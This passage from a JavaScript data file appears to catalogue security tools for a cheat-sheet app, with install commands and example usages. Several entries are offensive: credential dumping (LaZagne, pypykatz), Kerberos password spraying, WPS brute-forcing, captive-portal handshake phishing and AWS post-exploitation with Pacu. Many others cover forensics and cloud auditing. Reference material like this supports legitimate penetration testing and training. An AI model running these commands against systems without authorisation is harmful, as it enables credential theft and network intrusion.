      { flag: "-a", desc: "Parse default usernames and passwords from Alecto DB" },
      { flag: "-q", desc: "Quiet mode" },
    ],
    links: "https://github.com/Mebus/cupp",
  },

  {
    id: "mentalist",
    name: "Mentalist",
    cat: "Passwords",
    kind: "local",
    desc: "GUI-based wordlist generator for custom password dictionaries with rule chaining and mangling",
    install: "pip install mentalist",
    usage: [
      "mentalist",
      "# GUI: Base Words -> Add Case -> Add Append -> Generate",
      "# GUI: Load a base wordlist -> chain transform rules",
      "# GUI: Export as hashcat rules or direct wordlist",
      "# GUI: Use date/year append and leet substitutions",
    ],
    flags: [
      { flag: "Base Words", desc: "Starting wordlist or custom word set" },
      { flag: "Case", desc: "Transform case: upper, lower, capitalize, toggle" },
      { flag: "Substitution", desc: "Leet speak and custom character replacement" },
      { flag: "Append/Prepend", desc: "Add strings, numbers, or special chars" },
      { flag: "Generate", desc: "Output final wordlist or hashcat rules" },
    ],
    links: "https://github.com/sc0tfree/mentalist",
  },

  {
    id: "ophcrack",
    name: "Ophcrack",
    cat: "Passwords",
    kind: "local",
    desc: "Windows password cracker using rainbow tables -- fast LM and NTLM hash cracking with GUI or CLI",
    install: "sudo apt install -y ophcrack",
    usage: [
      "ophcrack",
      "ophcrack -g -d /path/to/tables -t /path/to/tables",
      "ophcrack -n 5 -f hashes.txt -t /path/to/tables",
      "ophcrack -S /dev/sda1 -t /path/to/tables",
      "ophcrack -f pwdump.txt -t tables/ -o cracked.txt",
    ],
    flags: [
      { flag: "-g", desc: "Run in GUI mode" },
      { flag: "-f", desc: "Input file with password hashes (pwdump format)" },
      { flag: "-t", desc: "Path to rainbow tables directory" },
      { flag: "-n", desc: "Number of threads" },
      { flag: "-d", desc: "Table directory for searching" },
      { flag: "-S", desc: "SAM file or partition to crack from" },
      { flag: "-o", desc: "Output file for cracked passwords" },
    ],
    links: "https://ophcrack.sourceforge.io/",
  },

  {
    id: "rainbowcrack",
    name: "RainbowCrack",
    cat: "Passwords",
    kind: "local",
    desc: "Hash cracker using rainbow table lookup -- generate and use time-memory tradeoff tables for fast cracking",
    install: "sudo apt install -y rainbowcrack",
    usage: [
      "rtgen md5 loweralpha 1 7 0 3800 33554432 0",
      "rtsort /path/to/tables/",
      "rcrack /path/to/tables/ -h 5d41402abc4b2a76b9719d911017c592",
      "rcrack /path/to/tables/ -l hashes.txt",
      "rcrack /path/to/tables/ -f pwdump.txt",
    ],
    flags: [
      { flag: "rtgen", desc: "Generate rainbow tables for a hash algorithm" },
      { flag: "rtsort", desc: "Sort generated rainbow table files" },
      { flag: "rcrack", desc: "Crack hashes using rainbow tables" },
      { flag: "-h", desc: "Single hash to crack" },
      { flag: "-l", desc: "File with list of hashes" },
      { flag: "-f", desc: "pwdump format hash file" },
    ],
    links: "https://project-rainbowcrack.com/",
  },

  {
    id: "hashid",
    name: "hashID",
    cat: "Passwords",
    kind: "local",
    desc: "Identify the type of a hash -- supports 220+ hash types and shows corresponding hashcat/john modes",
    install: "pip install hashid",
    usage: [
      "hashid '5d41402abc4b2a76b9719d911017c592'",
      "hashid -m '5d41402abc4b2a76b9719d911017c592'",
      "hashid -j '$2a$12$LJ3m4ys...'",
      "hashid -f hashes.txt",
      "echo '5d41402abc4b2a76b9719d911017c592' | hashid -m -j",
    ],
    flags: [
      { flag: "-m", desc: "Show corresponding hashcat mode" },
      { flag: "-j", desc: "Show corresponding John the Ripper format" },
      { flag: "-f", desc: "Read hashes from a file" },
      { flag: "-e", desc: "Include extended hash types" },
      { flag: "-o", desc: "Write output to a file" },
    ],
    links: "https://github.com/psypanda/hashID",
  },

  {
    id: "nth",
    name: "Name-That-Hash",
    cat: "Passwords",
    kind: "local",
    desc: "Modern hash identification tool -- faster than hashID with popularity ranking and API support",
    install: "pip install name-that-hash",
    usage: [
      "nth -t '5d41402abc4b2a76b9719d911017c592'",
      "nth -f hashes.txt",
      "nth -t '$2b$12$...' -g",
      "nth -t 'e10adc3949ba59abbe56e057f20f883e' -a",
      "echo '098f6bcd4621d373cade4e832627b4f6' | nth",
    ],
    flags: [
      { flag: "-t", desc: "Single hash to identify" },
      { flag: "-f", desc: "File containing hashes" },
      { flag: "-g", desc: "Output as greppable format" },
      { flag: "-a", desc: "Show all possible hash types (not just popular)" },
      { flag: "--no-banner", desc: "Suppress the banner" },
    ],
    links: "https://github.com/HashPals/Name-That-Hash",
  },

  {
    id: "crunch",
    name: "crunch",
    cat: "Passwords",
    kind: "local",
    desc: "Wordlist generator that creates password lists with specific character sets, patterns, and permutations",
    install: "sudo apt install -y crunch",
    usage: [
      "crunch 8 8 -o wordlist.txt",
      "crunch 6 8 abcdef123 -o custom.txt",
      "crunch 8 8 -t @@@@%%%% -o pattern.txt",
      "crunch 4 4 0123456789 | aircrack-ng -b AA:BB:CC:DD:EE:FF -w - capture.cap",
      "crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o mixed.txt",
    ],
    flags: [
      { flag: "min max", desc: "Minimum and maximum length of passwords" },
      { flag: "-o", desc: "Output file" },
      { flag: "-t", desc: "Pattern: @ = lowercase, , = uppercase, % = numbers, ^ = symbols" },
      { flag: "-f", desc: "Use a charset file" },
      { flag: "-b", desc: "Maximum file size per output chunk" },
      { flag: "-c", desc: "Maximum number of lines per output file" },
    ],
    links: "https://sourceforge.net/projects/crunch-wordlist/",
  },

  // ---------------------------------------------------------------------------
  //  Post-exploitation
  // ---------------------------------------------------------------------------

  {
    id: "winpeas",
    name: "WinPEAS",
    cat: "Post-ex",
    kind: "local",
    desc: "Windows Privilege Escalation Awesome Scripts -- enumerate misconfigurations for local privilege escalation",
    install: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe",
    usage: [
      ".\\winpeas.exe",
      ".\\winpeas.exe fast",
      ".\\winpeas.exe cmd",
      ".\\winpeas.exe systeminfo userinfo",
      ".\\winpeas.exe quiet servicesinfo",
    ],
    flags: [
      { flag: "fast", desc: "Skip time-consuming checks" },
      { flag: "cmd", desc: "Use cmd.exe instead of PowerShell" },
      { flag: "systeminfo", desc: "Show system information only" },
      { flag: "userinfo", desc: "Show user and group information" },
      { flag: "servicesinfo", desc: "Show services and permissions" },
      { flag: "quiet", desc: "Suppress banner and colors" },
    ],
    links: "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS",
  },

  {
    id: "pspy",
    name: "pspy",
    cat: "Post-ex",
    kind: "local",
    desc: "Unprivileged Linux process snooping tool -- monitor processes and cron jobs without root",
    install: "curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64 && chmod +x pspy64",
    usage: [
      "./pspy64",
      "./pspy64 -p -i 1000",
      "./pspy64 -f",
      "./pspy64 -r /tmp -r /etc/cron.d",
      "./pspy64 -c -i 500",
    ],
    flags: [
      { flag: "-p", desc: "Print commands run by other users" },
      { flag: "-f", desc: "Print file system events" },
      { flag: "-i", desc: "Interval in milliseconds between scans" },
      { flag: "-r", desc: "Directory to watch recursively for file events" },
      { flag: "-c", desc: "Use color output" },
    ],
    links: "https://github.com/DominicBreuker/pspy",
  },

  {
    id: "kerbrute",
    name: "kerbrute",
    cat: "Post-ex",
    kind: "local",
    desc: "Tool to brute-force and enumerate valid Active Directory accounts through Kerberos pre-authentication",
    install: "go install github.com/ropnop/kerbrute@latest",
    usage: [
      "kerbrute userenum -d example.local --dc 10.0.0.5 usernames.txt",
      "kerbrute passwordspray -d example.local --dc 10.0.0.5 users.txt 'Password123!'",
      "kerbrute bruteuser -d example.local --dc 10.0.0.5 passwords.txt administrator",
      "kerbrute userenum -d example.local --dc 10.0.0.5 -t 20 users.txt",
      "kerbrute bruteforce -d example.local --dc 10.0.0.5 combos.txt",
    ],
    flags: [
      { flag: "userenum", desc: "Enumerate valid usernames via Kerberos" },
      { flag: "passwordspray", desc: "Spray a password against a list of users" },
      { flag: "bruteuser", desc: "Brute-force a single user with a password list" },
      { flag: "bruteforce", desc: "Brute-force with user:password combos" },
      { flag: "-d", desc: "Target domain" },
      { flag: "--dc", desc: "Domain controller IP" },
      { flag: "-t", desc: "Number of threads (default 10)" },
    ],
    links: "https://github.com/ropnop/kerbrute",
  },

  {
    id: "lazagne",
    name: "LaZagne",
    cat: "Post-ex",
    kind: "local",
    desc: "Retrieve passwords stored on a local machine from browsers, mail clients, databases, WiFi, and more",
    install: "pip install lazagne",
    usage: [
      "lazagne all",
      "lazagne browsers",
      "lazagne wifi",
      "lazagne all -oJ",
      "lazagne all -quiet -oA",
    ],
    flags: [
      { flag: "all", desc: "Search for all supported credentials" },
      { flag: "browsers", desc: "Search browser stored passwords only" },
      { flag: "wifi", desc: "Search WiFi stored passwords only" },
      { flag: "-oJ", desc: "Output results as JSON" },
      { flag: "-oA", desc: "Output in all formats" },
      { flag: "-quiet", desc: "Suppress banner and verbose output" },
    ],
    links: "https://github.com/AlessandroZ/LaZagne",
  },

  {
    id: "pypykatz",
    name: "pypykatz",
    cat: "Post-ex",
    kind: "local",
    desc: "Python implementation of mimikatz -- extract credentials from LSASS dumps, registry hives, and more",
    install: "pipx install pypykatz",
    usage: [
      "pypykatz lsa minidump lsass.dmp",
      "pypykatz registry --sam SAM --security SECURITY --system SYSTEM",
      "pypykatz lsa minidump lsass.dmp -o creds.txt",
      "pypykatz dpapi prekey password -S <SID> 'Password123!'",
      "pypykatz live lsa",
    ],
    flags: [
      { flag: "lsa minidump", desc: "Parse an LSASS minidump file" },
      { flag: "registry", desc: "Parse registry hive files (SAM, SYSTEM, SECURITY)" },
      { flag: "live lsa", desc: "Dump credentials from live system (requires admin)" },
      { flag: "-o", desc: "Output file for extracted credentials" },
      { flag: "dpapi", desc: "DPAPI blob decryption" },
      { flag: "--sam", desc: "Path to SAM registry hive" },
    ],
    links: "https://github.com/skelsec/pypykatz",
  },

  {
    id: "seatbelt",
    name: "Seatbelt",
    cat: "Post-ex",
    kind: "local",
    desc: "C# security audit tool for Windows hosts -- enumerate system data, user data, and misconfigured settings",
    install: "curl -L https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe -o Seatbelt.exe",
    usage: [
      ".\\Seatbelt.exe -group=all",
      ".\\Seatbelt.exe -group=system",
      ".\\Seatbelt.exe -group=user",
      ".\\Seatbelt.exe -group=misc -outputfile=results.txt",
      ".\\Seatbelt.exe InterestingFiles CredEnum TokenPrivileges",
    ],
    flags: [
      { flag: "-group=all", desc: "Run all enumeration commands" },
      { flag: "-group=system", desc: "Run system enumeration commands" },
      { flag: "-group=user", desc: "Run user-level enumeration commands" },
      { flag: "-outputfile", desc: "Write output to a file" },
      { flag: "-q", desc: "Quiet mode, suppress banner" },
      { flag: "CredEnum", desc: "Enumerate Windows Credential Manager" },
    ],
    links: "https://github.com/GhostPack/Seatbelt",
  },

  // ---------------------------------------------------------------------------
  //  Wireless
  // ---------------------------------------------------------------------------

  {
    id: "kismet",
    name: "Kismet",
    cat: "Wireless",
    kind: "local",
    desc: "Wireless network detector, sniffer, and IDS for WiFi, Bluetooth, BTLE, and other wireless protocols",
    install: "sudo apt install -y kismet",
    usage: [
      "kismet -c wlan0",
      "kismet -c wlan0 --no-logging",
      "kismet -c wlan0,wlan1",
      "kismet --override wardrive",
      "kismet -c wlan0 --log-prefix scan_01",
    ],
    flags: [
      { flag: "-c", desc: "Capture source (interface)" },
      { flag: "--no-logging", desc: "Disable logging to disk" },
      { flag: "--log-prefix", desc: "Set prefix for log file names" },
      { flag: "--override", desc: "Load an override config (e.g. wardrive)" },
      { flag: "--no-ncurses", desc: "Disable ncurses UI, use stdout" },
      { flag: "--daemonize", desc: "Run as a background daemon" },
    ],
    links: "https://www.kismetwireless.net/",
  },

  {
    id: "bully",
    name: "Bully",
    cat: "Wireless",
    kind: "local",
    desc: "WPS brute-force attack tool -- cracks the WPS pin to recover the WPA/WPA2 passphrase",
    install: "sudo apt install -y bully",
    usage: [
      "bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6",
      "bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -S",
      "bully wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670",
      "bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -l 3",
      "bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3",
    ],
    flags: [
      { flag: "-b", desc: "Target BSSID (MAC address of AP)" },
      { flag: "-c", desc: "Channel number" },
      { flag: "-S", desc: "Use small DH keys for speed" },
      { flag: "-p", desc: "Starting pin number" },
      { flag: "-l", desc: "Lock delay in seconds between attempts" },
      { flag: "-d", desc: "Debug mode" },
      { flag: "-v", desc: "Verbosity level (1-3)" },
    ],
    links: "https://github.com/aanarchyy/bully",
  },

  {
    id: "reaver",
    name: "Reaver",
    cat: "Wireless",
    kind: "local",
    desc: "WPS attack tool to recover WPA/WPA2 passphrases by brute-forcing the WPS registrar PIN",
    install: "sudo apt install -y reaver",
    usage: [
      "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
      "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv",
      "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K",
      "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670",
      "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 2 -l 5",
    ],
    flags: [
      { flag: "-i", desc: "Monitor-mode interface" },
      { flag: "-b", desc: "Target BSSID" },
      { flag: "-c", desc: "Channel number" },
      { flag: "-vv", desc: "Verbose output" },
      { flag: "-K", desc: "Use PixieWPS offline attack" },
      { flag: "-p", desc: "Starting PIN" },
      { flag: "-d", desc: "Delay between attempts (seconds)" },
      { flag: "-l", desc: "Lock delay when AP locks WPS" },
    ],
    links: "https://github.com/t6x/reaver-wps-fork-t6x",
  },

  {
    id: "fluxion",
    name: "Fluxion",
    cat: "Wireless",
    kind: "local",
    desc: "Security auditing tool for wireless networks -- social-engineering-based WPA handshake recovery",
    install: "git clone https://github.com/FluxionNetwork/fluxion.git && cd fluxion && sudo ./fluxion.sh -i",
    usage: [
      "sudo ./fluxion.sh",
      "sudo ./fluxion.sh -l en",
      "sudo ./fluxion.sh -e wlan0",
      "# Interactive: select attack -> captive portal -> choose AP",
      "# Interactive: deauth target -> capture handshake -> serve portal",
    ],
    flags: [
      { flag: "-i", desc: "Install dependencies" },
      { flag: "-l", desc: "Language (en, es, de, fr, etc.)" },
      { flag: "-e", desc: "Select wireless interface" },
      { flag: "-v", desc: "Show script version" },
      { flag: "-d", desc: "Debug mode" },
    ],
    links: "https://github.com/FluxionNetwork/fluxion",
  },

  // ---------------------------------------------------------------------------
  //  Forensics
  // ---------------------------------------------------------------------------

  {
    id: "autopsy",
    name: "Autopsy",
    cat: "Forensics",
    kind: "local",
    desc: "Digital forensics platform and GUI for The Sleuth Kit -- disk image analysis, timeline, keyword search",
    install: "sudo apt install -y autopsy",
    usage: [
      "autopsy",
      "# Browser UI at http://localhost:9999/autopsy",
      "# Add a new case -> add disk image -> analyze",
      "# File Analysis -> Keyword Search -> Timeline",
      "# Data Sources -> File Types -> Deleted Files",
    ],
    flags: [
      { flag: "New Case", desc: "Create a new forensic case" },
      { flag: "Add Data Source", desc: "Import disk image, partition, or directory" },
      { flag: "Keyword Search", desc: "Search for strings in the image" },
      { flag: "Timeline", desc: "Generate a file activity timeline" },
      { flag: "Hash Lookup", desc: "Compare file hashes against known databases" },
    ],
    links: "https://www.autopsy.com/",
  },

  {
    id: "foremost",
    name: "foremost",
    cat: "Forensics",
    kind: "local",
    desc: "Console program to recover files based on headers, footers, and internal data structures (file carving)",
    install: "sudo apt install -y foremost",
    usage: [
      "foremost -i disk.img -o output/",
      "foremost -t jpg,png,pdf -i disk.img -o carved/",
      "foremost -i /dev/sda1 -o recovered/",
      "foremost -v -i disk.img -o output/",
      "foremost -t all -i memory.dmp -o results/",
    ],
    flags: [
      { flag: "-i", desc: "Input file or device" },
      { flag: "-o", desc: "Output directory for recovered files" },
      { flag: "-t", desc: "File types to recover (jpg, png, pdf, doc, exe, all)" },
      { flag: "-v", desc: "Verbose mode, log all headers found" },
      { flag: "-q", desc: "Quick mode (skip header/footer validation)" },
      { flag: "-c", desc: "Configuration file path" },
    ],
    links: "https://sourceforge.net/projects/foremost/",
  },

  {
    id: "steghide",
    name: "steghide",
    cat: "Forensics",
    kind: "local",
    desc: "Steganography tool to hide and extract data within JPEG, BMP, WAV, and AU files",
    install: "sudo apt install -y steghide",
    usage: [
      "steghide embed -cf cover.jpg -ef secret.txt",
      "steghide extract -sf stego.jpg",
      "steghide embed -cf cover.jpg -ef secret.txt -p 'passphrase'",
      "steghide info stego.jpg",
      "steghide extract -sf stego.jpg -xf output.txt -p 'passphrase'",
    ],
    flags: [
      { flag: "embed", desc: "Hide data inside a cover file" },
      { flag: "extract", desc: "Extract hidden data from a stego file" },
      { flag: "info", desc: "Show information about a file" },
      { flag: "-cf", desc: "Cover file (the image or audio carrier)" },
      { flag: "-ef", desc: "Embed file (the secret data)" },
      { flag: "-sf", desc: "Stego file to extract from" },
      { flag: "-p", desc: "Passphrase for encryption" },
      { flag: "-xf", desc: "Extraction output filename" },
    ],
    links: "https://steghide.sourceforge.net/",
  },

  {
    id: "stegseek",
    name: "stegseek",
    cat: "Forensics",
    kind: "local",
    desc: "Lightning-fast steghide cracker -- brute-force steghide passphrases at thousands of attempts per second",
    install: "sudo apt install -y stegseek",
    usage: [
      "stegseek stego.jpg wordlist.txt",
      "stegseek --seed stego.jpg",
      "stegseek stego.jpg rockyou.txt -xf extracted.txt",
      "stegseek --crack stego.jpg wordlist.txt",
      "stegseek -t 4 stego.jpg wordlist.txt",
    ],
    flags: [
      { flag: "--crack", desc: "Crack the passphrase using a wordlist" },
      { flag: "--seed", desc: "Detect if file has steghide data (no cracking)" },
      { flag: "-xf", desc: "Output file for extracted data" },
      { flag: "-t", desc: "Number of threads" },
      { flag: "-sf", desc: "Stego file to attack" },
    ],
    links: "https://github.com/RickdeJager/stegseek",
  },

  {
    id: "bulk-extractor",
    name: "bulk_extractor",
    cat: "Forensics",
    kind: "local",
    desc: "High-performance digital forensics tool that extracts emails, URLs, credit cards, and other artifacts from disk images",
    install: "sudo apt install -y bulk-extractor",
    usage: [
      "bulk_extractor -o output_dir disk.img",
      "bulk_extractor -e email -e url -o results/ disk.img",
      "bulk_extractor -x gps -o output/ disk.img",
      "bulk_extractor -j 4 -o output/ disk.img",
      "bulk_extractor -R /mnt/evidence/ -o output/",
    ],
    flags: [
      { flag: "-o", desc: "Output directory (must not exist)" },
      { flag: "-e", desc: "Enable specific scanner (email, url, ccn, etc.)" },
      { flag: "-x", desc: "Disable specific scanner" },
      { flag: "-j", desc: "Number of threads" },
      { flag: "-R", desc: "Recursively process a directory" },
      { flag: "-S", desc: "Set a scanner parameter" },
    ],
    links: "https://github.com/simsong/bulk_extractor",
  },

  {
    id: "sleuthkit",
    name: "The Sleuth Kit",
    cat: "Forensics",
    kind: "local",
    desc: "Collection of command-line tools for forensic analysis of disk images and file systems (NTFS, FAT, EXT, HFS+)",
    install: "sudo apt install -y sleuthkit",
    usage: [
      "mmls disk.img",
      "fls -r -o 2048 disk.img",
      "icat -o 2048 disk.img 65 > recovered_file",
      "tsk_recover -o 2048 -e disk.img output/",
      "fsstat -o 2048 disk.img",
    ],
    flags: [
      { flag: "mmls", desc: "Display partition layout of a volume" },
      { flag: "fls", desc: "List files and directories (including deleted)" },
      { flag: "icat", desc: "Extract file contents by inode number" },
      { flag: "tsk_recover", desc: "Recover all files from an image" },
      { flag: "fsstat", desc: "Display file system details" },
      { flag: "-o", desc: "Sector offset of the partition" },
      { flag: "-r", desc: "Recursive listing" },
    ],
    links: "https://www.sleuthkit.org/",
  },

  {
    id: "yara",
    name: "YARA",
    cat: "Forensics",
    kind: "local",
    desc: "Pattern matching tool for malware researchers -- identify and classify malware samples with custom rules",
    install: "sudo apt install -y yara",
    usage: [
      "yara rules.yar suspicious_file",
      "yara -r rules.yar /path/to/scan/",
      "yara -s rules.yar malware_sample",
      "yara -c rules.yar /path/to/directory/",
      "yara -t ransomware rules.yar suspects/",
    ],
    flags: [
      { flag: "-r", desc: "Recursively scan directories" },
      { flag: "-s", desc: "Print matching strings" },
      { flag: "-c", desc: "Print only match count per file" },
      { flag: "-t", desc: "Only run rules tagged with this string" },
      { flag: "-n", desc: "Print non-matching rules" },
      { flag: "-w", desc: "Disable warnings" },
      { flag: "-p", desc: "Number of threads" },
    ],
    links: "https://virustotal.github.io/yara/",
  },

  {
    id: "photorec",
    name: "PhotoRec",
    cat: "Forensics",
    kind: "local",
    desc: "File data recovery tool that recovers lost files from hard disks, memory cards, and CD-ROMs",
    install: "sudo apt install -y testdisk",
    usage: [
      "photorec /dev/sda",
      "photorec disk.img",
      "photorec /d /output/dir/ /dev/sda1",
      "# Interactive: select partition -> choose file types -> recover",
      "testdisk /dev/sda",
    ],
    flags: [
      { flag: "/dev/sdX", desc: "Target device or disk image" },
      { flag: "/d", desc: "Set the destination directory for recovered files" },
      { flag: "File Opt", desc: "Interactive menu to select file types to recover" },
      { flag: "Search", desc: "Start the recovery process" },
      { flag: "Whole Disk", desc: "Scan the entire disk regardless of partitions" },
    ],
    links: "https://www.cgsecurity.org/wiki/PhotoRec",
  },

  // ---------------------------------------------------------------------------
  //  Mobile
  // ---------------------------------------------------------------------------

  {
    id: "apktool",
    name: "Apktool",
    cat: "Mobile",
    kind: "local",
    desc: "Reverse-engineer Android APK files -- decode resources, rebuild, and sign modified APKs",
    install: "sudo apt install -y apktool",
    usage: [
      "apktool d app.apk",
      "apktool d app.apk -o output_dir",
      "apktool b output_dir -o modified.apk",
      "apktool d -f -r app.apk",
      "apktool if framework-res.apk",
    ],
    flags: [
      { flag: "d", desc: "Decode (decompile) an APK file" },
      { flag: "b", desc: "Build (recompile) from decoded source" },
      { flag: "-o", desc: "Output directory or file" },
      { flag: "-f", desc: "Force overwrite existing output" },
      { flag: "-r", desc: "Do not decode resources" },
      { flag: "if", desc: "Install a framework file for decoding" },
    ],
    links: "https://apktool.org/",
  },

  {
    id: "jadx",
    name: "JADX",
    cat: "Mobile",
    kind: "local",
    desc: "Dex to Java decompiler -- produce Java source code from Android APK and DEX files with GUI or CLI",
    install: "sudo apt install -y jadx",
    usage: [
      "jadx app.apk",
      "jadx -d output/ app.apk",
      "jadx-gui app.apk",
      "jadx --deobf app.apk",
      "jadx --show-bad-code -d output/ classes.dex",
    ],
    flags: [
      { flag: "-d", desc: "Output directory for decompiled source" },
      { flag: "--deobf", desc: "Enable deobfuscation of names" },
      { flag: "--show-bad-code", desc: "Show code even if decompilation has errors" },
      { flag: "-e", desc: "Export resources only" },
      { flag: "--threads-count", desc: "Number of processing threads" },
      { flag: "jadx-gui", desc: "Open in the graphical interface" },
    ],
    links: "https://github.com/skylot/jadx",
  },

  {
    id: "frida",
    name: "Frida",
    cat: "Mobile",
    kind: "local",
    desc: "Dynamic instrumentation toolkit -- inject scripts into running processes on iOS, Android, Windows, macOS, Linux",
    install: "pip install frida-tools",
    usage: [
      "frida -U -f com.example.app",
      "frida -U -l script.js com.example.app",
      "frida-ps -U",
      "frida-trace -U -i 'open*' com.example.app",
      "frida -U --codeshare user/script com.example.app",
    ],
    flags: [
      { flag: "-U", desc: "Connect to USB device" },
      { flag: "-f", desc: "Spawn and attach to a package" },
      { flag: "-l", desc: "Load a JavaScript instrumentation script" },
      { flag: "--codeshare", desc: "Load a script from Frida CodeShare" },
      { flag: "-n", desc: "Attach to process by name" },
      { flag: "-p", desc: "Attach to process by PID" },
    ],
    links: "https://frida.re/",
  },

  {
    id: "objection",
    name: "objection",
    cat: "Mobile",
    kind: "local",
    desc: "Runtime mobile exploration toolkit powered by Frida -- bypass SSL pinning, dump keychain, explore filesystems",
    install: "pipx install objection",
    usage: [
      "objection -g com.example.app explore",
      "objection -g com.example.app explore --startup-command 'android sslpinning disable'",
      "objection patchapk -s app.apk",
      "# In console: android sslpinning disable",
      "# In console: android hooking list classes",
    ],
    flags: [
      { flag: "-g", desc: "Target app package name or PID" },
      { flag: "explore", desc: "Start interactive exploration session" },
      { flag: "--startup-command", desc: "Run a command immediately on attach" },
      { flag: "patchapk", desc: "Patch an APK to include Frida gadget" },
      { flag: "-s", desc: "Source APK file to patch" },
      { flag: "-N", desc: "Connect to a network Frida server" },
    ],
    links: "https://github.com/sensepost/objection",
  },

  {
    id: "drozer",
    name: "drozer",
    cat: "Mobile",
    kind: "local",
    desc: "Android security testing framework -- find vulnerabilities in apps and devices via IPC endpoints",
    install: "pipx install drozer",
    usage: [
      "drozer console connect",
      "# In console: run app.package.list -f example",
      "# In console: run app.package.info -a com.example.app",
      "# In console: run app.package.attacksurface com.example.app",
      "# In console: run scanner.provider.injection -a com.example.app",
    ],
    flags: [
      { flag: "console connect", desc: "Connect to the drozer agent on device" },
      { flag: "app.package.list", desc: "List installed packages" },
      { flag: "app.package.info", desc: "Show package metadata" },
      { flag: "app.package.attacksurface", desc: "Enumerate exported components" },
      { flag: "scanner.provider.injection", desc: "Test for content provider injection" },
      { flag: "app.activity.start", desc: "Launch an exported activity" },
    ],
    links: "https://github.com/WithSecureLabs/drozer",
  },

  {
    id: "mobsf",
    name: "MobSF",
    cat: "Mobile",
    kind: "local",
    desc: "Mobile Security Framework -- automated static and dynamic analysis of Android, iOS, and Windows mobile apps",
    install: "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest",
    usage: [
      "# Web UI at http://localhost:8000",
      "# Upload APK/IPA -> automatic static analysis",
      "# View: manifest, permissions, code analysis, strings",
      "# Dynamic analysis: connect emulator -> start instrumented app",
      "# REST API: curl -F 'file=@app.apk' http://localhost:8000/api/v1/upload -H 'Authorization: key'",
    ],
    flags: [
      { flag: "Static Analysis", desc: "Decompile and scan code, manifest, permissions" },
      { flag: "Dynamic Analysis", desc: "Runtime testing with an emulator" },
      { flag: "API Fuzzing", desc: "Fuzz discovered API endpoints" },
      { flag: "Malware Analysis", desc: "Detect known malware patterns" },
      { flag: "REST API", desc: "Automate scans via HTTP API" },
    ],
    links: "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
  },

  // ---------------------------------------------------------------------------
  //  Cloud
  // ---------------------------------------------------------------------------

  {
    id: "prowler",
    name: "Prowler",
    cat: "Cloud",
    kind: "local",
    desc: "Cloud security assessment tool for AWS, Azure, and GCP -- CIS benchmarks, GDPR, HIPAA, PCI-DSS compliance",
    install: "pipx install prowler",
    usage: [
      "prowler aws",
      "prowler aws --severity critical high",
      "prowler aws -c iam_root_mfa_enabled s3_bucket_public_access",
      "prowler aws -M csv json-ocsf -o results/",
      "prowler azure --sp-env-auth",
    ],
    flags: [
      { flag: "aws", desc: "Run AWS security assessment" },
      { flag: "azure", desc: "Run Azure security assessment" },
      { flag: "gcp", desc: "Run GCP security assessment" },
      { flag: "--severity", desc: "Filter checks by severity level" },
      { flag: "-c", desc: "Run specific checks only" },
      { flag: "-M", desc: "Output format: csv, json, json-ocsf, html" },
      { flag: "-o", desc: "Output directory" },
    ],
    links: "https://github.com/prowler-cloud/prowler",
  },

  {
    id: "scoutsuite",
    name: "ScoutSuite",
    cat: "Cloud",
    kind: "local",
    desc: "Multi-cloud security auditing tool -- AWS, Azure, GCP, Alibaba, Oracle with interactive HTML report",
    install: "pipx install scoutsuite",
    usage: [
      "scout aws",
      "scout aws --profile my-profile",
      "scout aws --regions us-east-1 us-west-2",
      "scout azure --cli",
      "scout gcp --service-account key.json",
    ],
    flags: [
      { flag: "aws", desc: "Audit AWS environment" },
      { flag: "azure", desc: "Audit Azure environment" },
      { flag: "gcp", desc: "Audit GCP environment" },
      { flag: "--profile", desc: "AWS profile name from credentials file" },
      { flag: "--regions", desc: "Specific regions to audit" },
      { flag: "--services", desc: "Specific services to audit" },
      { flag: "--report-dir", desc: "Output directory for HTML report" },
    ],
    links: "https://github.com/nccgroup/ScoutSuite",
  },

  {
    id: "pacu",
    name: "Pacu",
    cat: "Cloud",
    kind: "local",
    desc: "AWS exploitation framework for offensive security testing -- enumeration, escalation, and post-exploitation",
    install: "pipx install pacu",
    usage: [
      "pacu",
      "# In console: set_keys -> run iam__enum_permissions",
      "# In console: run iam__privesc_scan",
      "# In console: run ec2__enum",
      "# In console: run s3__download_bucket -b bucket-name",
    ],
    flags: [
      { flag: "set_keys", desc: "Configure AWS access key and secret" },
      { flag: "run", desc: "Execute a Pacu module" },
      { flag: "iam__enum_permissions", desc: "Enumerate IAM permissions for current user" },
      { flag: "iam__privesc_scan", desc: "Scan for privilege escalation paths" },
      { flag: "ec2__enum", desc: "Enumerate EC2 instances and security groups" },
      { flag: "s3__download_bucket", desc: "Download contents of an S3 bucket" },
    ],
    links: "https://github.com/RhinoSecurityLabs/pacu",
  },

  {
    id: "enumerate-iam",
    name: "enumerate-iam",
    cat: "Cloud",
    kind: "local",
    desc: "Enumerate AWS IAM permissions for a given set of credentials by brute-forcing API calls",
    install: "pip install enumerate-iam",
    usage: [
      "enumerate-iam --access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      "enumerate-iam --access-key AKIA... --secret-key wJal... --session-token FwoG...",
      "enumerate-iam --access-key AKIA... --secret-key wJal... --region us-east-1",
      "enumerate-iam --access-key AKIA... --secret-key wJal... 2>&1 | tee results.txt",
      "enumerate-iam --profile my-profile",
    ],
    flags: [
      { flag: "--access-key", desc: "AWS access key ID" },
      { flag: "--secret-key", desc: "AWS secret access key" },
      { flag: "--session-token", desc: "AWS session token (for temporary credentials)" },
      { flag: "--region", desc: "AWS region to test against" },
      { flag: "--profile", desc: "AWS CLI profile to use" },
    ],
    links: "https://github.com/andresriancho/enumerate-iam",
  },

